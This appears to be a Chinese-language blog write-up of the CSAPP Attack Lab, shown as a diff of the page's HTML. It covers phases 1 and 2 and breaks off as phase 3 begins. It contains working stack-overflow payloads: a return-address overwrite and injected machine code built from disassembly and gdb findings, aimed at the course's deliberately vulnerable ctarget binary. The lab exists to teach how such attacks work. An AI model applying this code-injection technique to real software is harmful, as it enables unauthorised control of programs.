@@ -1,0 +1,451 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CSAPP Attack Lab 題解 | asciibase64</title><meta name="author" content="asciibase64"><meta name="copyright" content="asciibase64"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="深入理解計算機系統官方Lab題解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP Attack Lab 題解">
+<meta property="og:url" content="https://ilsao.github.io/2025/05/30/CSAPP-Attack-Lab-%E9%A1%8C%E8%A7%A3/index.html">
+<meta property="og:site_name" content="asciibase64">
+<meta property="og:description" content="深入理解計算機系統官方Lab題解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilsao.github.io/pictures/AttackLab.png">
+<meta property="article:published_time" content="2025-05-30T13:46:16.000Z">
+<meta property="article:modified_time" content="2025-05-30T13:51:13.276Z">
+<meta property="article:author" content="asciibase64">
+<meta property="article:tag" content="計算機底層原理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilsao.github.io/pictures/AttackLab.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSAPP Attack Lab 題解",
+  "url": "https://ilsao.github.io/2025/05/30/CSAPP-Attack-Lab-%E9%A1%8C%E8%A7%A3/",
+  "image": "https://ilsao.github.io/pictures/AttackLab.png",
+  "datePublished": "2025-05-30T13:46:16.000Z",
+  "dateModified": "2025-05-30T13:51:13.276Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "asciibase64",
+      "url": "https://ilsao.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/pictures/dragon.png"><link rel="canonical" href="https://ilsao.github.io/2025/05/30/CSAPP-Attack-Lab-%E9%A1%8C%E8%A7%A3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CSAPP Attack Lab 題解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/pictures/A4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 鏈接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友情鏈接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/pictures/AttackLab.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">asciibase64</span></a><a class="nav-page-title" href="/"><span class="site-name">CSAPP Attack Lab 題解</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 鏈接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友情鏈接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CSAPP Attack Lab 題解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-30T13:46:16.000Z" title="发表于 2025-05-30 21:46:16">2025-05-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-30T13:51:13.276Z" title="更新于 2025-05-30 21:51:13">2025-05-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CSAPP/">CSAPP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>閱讀此篇題解需要有CSAPP第三章基礎，對於基本匯編指令本文不做過多說明。嘗試Lab前應先下載官方提供的<a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/attacklab.pdf">Writeup</a>並在開始每一階段前閱讀相應內容，否則容易一頭霧水。</p>
+<p>注意，因為我們是在本地運行Lab，所以運行程序時要加上參數<code>-q</code>，告訴程序不上數據傳到伺服器，否則無法運行。</p>
+<p>筆者學識稍淺，若有疏漏或錯誤處，歡迎各位大佬指正。</p>
+<h1 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h1><p>文檔給了<code>test</code>函數的C代碼：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>還給了<code>touch1</code>函數的代碼：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>題目要求當<code>getbuf</code>返回時不返回到下一行的<code>printf</code>，而是跳轉到<code>touch1</code>運行。</p>
+<p>首先查看<code>getbuf</code>的反彙編代碼：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017</span>a8 &lt;getbuf&gt;:</span><br><span class="line">  <span class="number">4017</span>a8:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>ac:	<span class="number">48</span> <span class="number">89</span> e7             	mov    %rsp,%rdi</span><br><span class="line">  <span class="number">4017</span>af:	e8 <span class="number">8</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b</span>4:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b</span>9:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017b</span>d:	c3                   	retq   </span><br><span class="line">  <span class="number">4017b</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">4017b</span>f:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>
+<p><code>0x4017a8</code>處指令開闢了大小<code>0x28 = 40</code>(字節)的棧空間，然後將棧頂作為參數(<code>%rdi</code>)傳給<code>Gets</code>函數。</p>
+<p>我們需要在輸入時輸入48字節的內容讓棧溢出，使返回地址被覆蓋為<code>touch1</code>的內存地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017</span>c0 &lt;touch1&gt;:</span><br><span class="line">  <span class="number">4017</span>c0:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>c4:	c7 <span class="number">05</span> <span class="number">0</span>e <span class="number">2</span>d <span class="number">20</span> <span class="number">00</span> <span class="number">01</span> 	movl   $<span class="number">0x1</span>,<span class="number">0x202d0e</span>(%rip)        # <span class="number">6044</span>dc &lt;vlevel&gt;</span><br><span class="line">  <span class="number">4017</span>cb:	<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">4017</span>ce:	bf c5 <span class="number">30</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4030c5</span>,%edi</span><br><span class="line">  <span class="number">4017</span>d3:	e8 e8 f4 ff ff       	callq  <span class="number">400</span>cc0 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">4017</span>d8:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">4017</span>dd:	e8 ab <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>c8d &lt;validate&gt;</span><br><span class="line">  <span class="number">4017e2</span>:	bf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%edi</span><br><span class="line">  <span class="number">4017e7</span>:	e8 <span class="number">54</span> f6 ff ff       	callq  <span class="number">400e40</span> &lt;<span class="built_in">exit</span>@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>查看代碼我們可以發先<code>touch1</code>首行指令在地址<code>0x4017c0</code>處，這是我們想讓代碼從<code>getbuf</code>返回的地址。(注意，因為機器採小端序，在輸入時應輸入<code>C0 17 40 00</code>)</p>
+<p>由此，我們可以構建出shellcode：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">C0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>我們將這段內容保存在檔案<code>phase_1</code>中，然後使用lab提供的工具<code>hex2raw</code>將其轉換成程序接受的<code>string</code>類型。</p>
+<p>注意，運行<code>ctarget</code>前要加上<code>-q</code>，防止因為程序連接不上伺服器而報錯。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; phase_1 | ./ctarget -q</span><br></pre></td></tr></table></figure>
+<p><img src="/pictures/AttackLab/1.png" alt=""></p>
+<h1 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h1><p>查看文檔，發現給出的<code>touch2</code>函數要求傳入一個無符號數，並檢查該輸入是否與<code>cookie</code>相等。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0.x%8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017</span>ec &lt;touch2&gt;:</span><br><span class="line">  <span class="number">4017</span>ec:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">4017f</span>0:	<span class="number">89</span> fa                	mov    %edi,%edx</span><br><span class="line">  <span class="number">4017f</span>2:	c7 <span class="number">05</span> e0 <span class="number">2</span>c <span class="number">20</span> <span class="number">00</span> <span class="number">02</span> 	movl   $<span class="number">0x2</span>,<span class="number">0x202ce0</span>(%rip)        # <span class="number">6044</span>dc &lt;vlevel&gt;</span><br><span class="line">  <span class="number">4017f</span>9:	<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">4017f</span>c:	<span class="number">3b</span> <span class="number">3</span>d e2 <span class="number">2</span>c <span class="number">20</span> <span class="number">00</span>    	cmp    <span class="number">0x202ce2</span>(%rip),%edi        # <span class="number">6044e4</span> &lt;cookie&gt;</span><br><span class="line">  <span class="number">401802</span>:	<span class="number">75</span> <span class="number">20</span>                	jne    <span class="number">401824</span> &lt;touch2+<span class="number">0x38</span>&gt;</span><br><span class="line">  <span class="number">401804</span>:	be e8 <span class="number">30</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4030e8</span>,%esi</span><br><span class="line">  <span class="number">401809</span>:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">40180</span>e:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401813</span>:	e8 d8 f5 ff ff       	callq  <span class="number">400</span>df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401818</span>:	bf <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x2</span>,%edi</span><br><span class="line">  <span class="number">40181</span>d:	e8 <span class="number">6b</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>c8d &lt;validate&gt;</span><br><span class="line">  <span class="number">401822</span>:	eb <span class="number">1</span>e                	jmp    <span class="number">401842</span> &lt;touch2+<span class="number">0x56</span>&gt;</span><br><span class="line">  <span class="number">401824</span>:	be <span class="number">10</span> <span class="number">31</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x403110</span>,%esi</span><br><span class="line">  <span class="number">401829</span>:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">40182</span>e:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401833</span>:	e8 b8 f5 ff ff       	callq  <span class="number">400</span>df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401838</span>:	bf <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x2</span>,%edi</span><br><span class="line">  <span class="number">40183</span>d:	e8 <span class="number">0</span>d <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>d4f &lt;fail&gt;</span><br><span class="line">  <span class="number">401842</span>:	bf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%edi</span><br><span class="line">  <span class="number">401847</span>:	e8 f4 f5 ff ff       	callq  <span class="number">400e40</span> &lt;<span class="built_in">exit</span>@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>首先查看代碼可以知道<code>touch2</code>函數開頭地址為<code>0x4017ec</code>。在Lab文件夾內有一個文件叫<code>cookie.txt</code>，裡面存放著我們需要的<code>cookie</code>值。</p>
+<p><img src="/pictures/AttackLab/2.png" alt=""></p>
+<p>因為我們要將<code>cookie</code>值傳給<code>touch2</code>，回想CSAPP第三章內容可以知道，函數的第一個參數存放在<code>%rdi</code>中。所以我們需要執行以下代碼：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movq $<span class="number">0x59b997fa</span>, %rdi</span><br></pre></td></tr></table></figure>
+<p>然後我們要調用<code>touch2</code>函數，即<code>0x4017ec</code>地址處。這裡我們不使用<code>call</code>或<code>jmp</code>而使用<code>ret</code>，因為偏移不好計算。注意，<code>ret</code>指令會跳轉到棧頂保存的地址，並將該地址出棧(<code>pop</code>)。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushq $<span class="number">0x4017ec</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>將三行彙編代碼結合在一起，就成功達成調用函數的功能了。我們將這段代碼保存在<code>phase_2_asm.s</code>中，然後使用指令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c phase_2_asm.s</span><br><span class="line">objdump -d phase_2_asm &gt; phase_2_asm.asm</span><br></pre></td></tr></table></figure>
+<p>打開phase_2_asm.asm，可以發現對應的機器代碼。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase_2_asm.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> 	mov    $<span class="number">0x59b997fa</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span>       	pushq  $<span class="number">0x4017ec</span></span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>
+<p>即：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 </span><br></pre></td></tr></table></figure>
+<p>有這些還不夠，因為這些數據在輸入後會被儲存在棧中，所以會被視為數據而非代碼的一部份。所以我們利用棧溢出將棧中原本的儲存地址覆蓋成棧頂(用戶輸入數據的存儲起始點)的位置，即可讓該段代碼被值行。(即將<code>%rip</code>設置為<code>%rsp</code>)</p>
+<p>通過gdb查看，我們可以發現用戶輸入數據的存儲起始點在<code>0x5561dc78</code>處。</p>
+<p><img src="/pictures/AttackLab/3.png" alt=""></p>
+<p>利用0填充空間後，我們可以構建出shellcode並將其保存在phase_2中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
+<p>利用以下代碼驗證其正確性：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; phase_2 | ./ctarget -q</span><br></pre></td></tr></table></figure>
+<p><img src="/pictures/AttackLab/4.png" alt=""></p>
+<h1 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h1><p>查看文檔，發現這題需要給<code>hexmatch</code>函數傳入一個等於<code>cookie</code>的字符串，其中字符串應傳入首字符的地址(<code>char *</code>)。</p>
